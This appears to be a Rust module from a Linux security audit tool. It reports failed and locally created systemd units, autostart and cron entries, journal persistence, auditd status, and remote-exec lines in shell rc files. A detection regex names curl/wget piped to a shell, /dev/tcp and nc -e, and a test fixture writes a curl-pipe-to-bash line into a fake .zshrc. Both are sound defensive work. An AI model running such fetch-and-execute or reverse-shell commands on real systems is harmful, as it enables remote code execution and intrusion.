//! "Services & persistence": failed units, locally made units, autostart,
//! cron, remote-exec lines in shell rc files, journal, auditd.

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::LazyLock;

use regex::bytes::Regex;

use crate::audit::{Ctx, Report, Section, read_text, walk};
use crate::contract::Target;

pub(super) const SECTION: Section = Section {
    name: "Services & persistence",
    run,
};

const RC_FILES: &[&str] = &[
    ".zshrc",
    ".bashrc",
    ".profile",
    ".zprofile",
    ".bash_profile",
];

static REMOTE_EXEC: LazyLock<Option<Regex>> = LazyLock::new(|| {
    Regex::new(r"(?-u)(curl|wget)[^|#]*\|\s*(ba|z)?sh|base64 -d.*\|\s*(ba)?sh|/dev/tcp/|\bnc\b.*-e")
        .ok()
});

fn is_unit(name: &str) -> bool {
    name.ends_with(".service") || name.ends_with(".timer")
}

/// Entries of `dir` matching `keep`, sorted, as a shell glob lists them.
fn glob(dir: &Path, keep: impl Fn(&str) -> bool) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter(|e| keep(&e.file_name().to_string_lossy()))
        .map(|e| e.path())
        .collect();
    out.sort();
    out
}

fn run(ctx: &Ctx, r: &mut Report) {
    failed_units(ctx, r);
    system_units(ctx, r);
    user_units(ctx, r);
    autostart_and_cron(ctx, r);
    rc_files(ctx, r);
    journal_and_audit(ctx, r);
}

fn failed_units(ctx: &Ctx, r: &mut Report) {
    let failed: Vec<String> = ctx
        .run(&["systemctl", "--failed", "--no-legend", "--plain"])
        .stdout
        .lines()
        .filter_map(|l| l.split_whitespace().next().map(str::to_owned))
        .collect();
    if failed.is_empty() {
        r.ok("services.failed_units", "No failed system units");
    } else {
        r.warn("services.failed_units", "Failed system units:")
            .detail(failed.join("\n"))
            .hint("Inspect with: journalctl -b -u <unit>");
    }
}

fn system_units(ctx: &Ctx, r: &mut Report) {
    let mut system_units = Vec::new();
    let system_dir = ctx.sys("/etc/systemd/system");
    // `-maxdepth 1`: list the directory, enter nothing below it.
    walk(
        &system_dir,
        |d, _| d == system_dir,
        |p, m| {
            let name = p
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            if m.is_file() && is_unit(&name) {
                system_units.push((ctx.unsys(p), name));
            }
            true
        },
    );
    if !system_units.is_empty() {
        let f = r.info(
            "services.system_units",
            "Locally created system units (not from packages):",
        );
        f.detail(
            system_units
                .iter()
                .map(|(p, _)| p.as_str())
                .collect::<Vec<_>>()
                .join("\n"),
        );
        for (path, name) in &system_units {
            f.target(Target::Unit {
                name: format!("system/{name}"),
            })
            .file(Path::new(path));
        }
    }
}

fn user_units(ctx: &Ctx, r: &mut Report) {
    // `find -maxdepth 2` with no `-type`: enabled-unit symlinks count too.
    let user_dir = ctx.home.join(".config/systemd/user");
    let mut user_units = Vec::new();
    walk(
        &user_dir,
        |d, _| d.parent() == Some(user_dir.as_path()) || d == user_dir,
        |p, _| {
            let name = p
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            if p != user_dir && is_unit(&name) {
                user_units.push((p.to_path_buf(), name));
            }
            true
        },
    );
    if !user_units.is_empty() {
        let f = r.info(
            "services.user_units",
            "User systemd units (persistence points):",
        );
        f.detail(
            user_units
                .iter()
                .map(|(p, _)| ctx.tilde(p))
                .collect::<Vec<_>>()
                .join("\n"),
        );
        for (path, name) in &user_units {
            f.target(Target::Unit {
                name: format!("user/{name}"),
            })
            .file(path);
        }
    }
}

fn autostart_and_cron(ctx: &Ctx, r: &mut Report) {
    let desktop = |n: &str| n.ends_with(".desktop") && !n.starts_with('.');
    let autostart = glob(&ctx.home.join(".config/autostart"), desktop).len()
        + glob(&ctx.sys("/etc/xdg/autostart"), desktop).len();
    if autostart > 0 {
        r.info(
            "services.autostart",
            format!("{autostart} XDG autostart entries (~/.config/autostart, /etc/xdg/autostart)"),
        );
    }

    let visible = |n: &str| !n.starts_with('.');
    let crons: Vec<String> = ["/etc/cron.d", "/var/spool/cron"]
        .iter()
        .flat_map(|d| glob(&ctx.sys(d), visible))
        .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .collect();
    if !crons.is_empty() {
        r.info("services.cron", "Cron entries present:")
            .detail(crons.join("\n"));
    }
}

fn rc_files(ctx: &Ctx, r: &mut Report) {
    if let Some(re) = REMOTE_EXEC.as_ref() {
        for rel in RC_FILES {
            let path = ctx.home.join(rel);
            if !path.is_file() {
                continue;
            }
            let text = read_text(&path);
            let hits: Vec<String> = text
                .lines()
                .enumerate()
                .filter(|(_, l)| re.is_match(l.as_bytes()))
                .map(|(i, l)| format!("{}:{l}", i + 1))
                .collect();
            if !hits.is_empty() {
                r.warn(
                    "services.rc_remote_exec",
                    format!("Suspicious remote-exec pattern in {}:", ctx.tilde(&path)),
                )
                .file(&path)
                .detail(hits.join("\n"))
                .hint("Make sure you added these lines yourself");
            }
        }
    }
}

fn journal_and_audit(ctx: &Ctx, r: &mut Report) {
    let mut confs = vec![ctx.sys("/etc/systemd/journald.conf")];
    confs.extend(glob(&ctx.sys("/etc/systemd/journald.conf.d"), |n| {
        n.ends_with(".conf")
    }));
    let storage = confs
        .iter()
        .flat_map(|f| read_text(f).lines().map(str::to_owned).collect::<Vec<_>>())
        .rfind(|l| l.trim_start().starts_with("Storage="));
    if ctx.sys("/var/log/journal").is_dir() {
        r.ok("services.journal", "Persistent journal enabled");
    } else {
        let shown = storage.unwrap_or_else(|| "Storage=auto".to_owned());
        r.warn(
            "services.journal",
            format!("Journal is volatile ({shown}); logs lost on reboot"),
        )
        .fix("sudo mkdir -p /var/log/journal && sudo systemctl restart systemd-journald");
    }

    if ctx.run(&["systemctl", "is-active", "-q", "auditd"]).success {
        r.ok("services.auditd", "auditd running");
    } else {
        let installed = if ctx.run(&["pacman", "-Q", "audit"]).success {
            "yes"
        } else {
            "no"
        };
        r.info(
            "services.auditd",
            format!("auditd not running (installed: {installed})"),
        );
    }
}

#[cfg(test)]
mod tests {
    use crate::checks::testing::{FakeSystem, msgs};
    use crate::contract::Severity::{Info, Pass, Warn};
    use crate::contract::Target;

    #[test]
    fn pattern_compiles() {
        assert!(
            super::REMOTE_EXEC.is_some(),
            "a bad pattern would skip the check silently"
        );
    }

    #[test]
    fn quiet_system() {
        let sys = FakeSystem::new();
        sys.dir_mode("/var/log/journal", 0o755);
        sys.cmd("systemctl is-active -q auditd", true, "");
        let got = msgs(&sys.ctx(false), super::SECTION);
        assert_eq!(
            got,
            vec![
                (Pass, "No failed system units".into()),
                (Pass, "Persistent journal enabled".into()),
                (Pass, "auditd running".into()),
            ]
        );
    }

    #[test]
    fn reports_persistence_points() {
        let sys = FakeSystem::new();
        sys.cmd(
            "systemctl --failed --no-legend --plain",
            true,
            "foo.service loaded failed failed Foo\n",
        );
        sys.cmd("pacman -Q audit", false, "");
        sys.file("/etc/systemd/system/backup.service", "[Service]");
        sys.file("/etc/systemd/system/multi-user.target.wants/x.service", "");
        sys.file("/etc/xdg/autostart/a.desktop", "");
        sys.file("/etc/cron.d/0hourly", "");
        sys.file(
            "/etc/systemd/journald.conf",
            "[Journal]\n#Storage=auto\nStorage=volatile\n",
        );
        let ctx = sys.ctx(false);
        sys.home_file(".config/systemd/user/sync.service", "");
        sys.home_file(".config/systemd/user/default.target.wants/sync.service", "");
        sys.home_file(".config/autostart/b.desktop", "");
        sys.home_file(".zshrc", "alias l=ls\ncurl -fsSL https://x.sh | bash\n");
        let got = msgs(&ctx, super::SECTION);
        for want in [
            (Warn, "Failed system units:".to_owned()),
            (
                Info,
                "Locally created system units (not from packages):".to_owned(),
            ),
            (Info, "User systemd units (persistence points):".to_owned()),
            (
                Info,
                "2 XDG autostart entries (~/.config/autostart, /etc/xdg/autostart)".to_owned(),
            ),
            (Info, "Cron entries present:".to_owned()),
            (
                Warn,
                "Suspicious remote-exec pattern in ~/.zshrc:".to_owned(),
            ),
            (
                Warn,
                "Journal is volatile (Storage=volatile); logs lost on reboot".to_owned(),
            ),
            (Info, "auditd not running (installed: no)".to_owned()),
        ] {
            assert!(got.contains(&want), "missing {want:?} in {got:#?}");
        }
        let report = crate::audit::run(&ctx, &[super::SECTION]);
        let by_id = |id: &str| {
            report
                .findings()
                .iter()
                .find(|f| f.id.as_deref() == Some(id))
                .cloned()
        };
        let system = by_id("services.system_units").unwrap_or_else(|| unreachable!("system units"));
        assert_eq!(
            system.detail, "/etc/systemd/system/backup.service",
            "maxdepth 1"
        );
        assert_eq!(
            system.targets[0],
            Target::Unit {
                name: "system/backup.service".into()
            }
        );
        let user = by_id("services.user_units").unwrap_or_else(|| unreachable!("user units"));
        assert_eq!(
            user.detail.lines().count(),
            2,
            "maxdepth 2 includes wants links"
        );
        let rc = by_id("services.rc_remote_exec").unwrap_or_else(|| unreachable!("rc"));
        assert_eq!(rc.detail, "2:curl -fsSL https://x.sh | bash");
    }
}
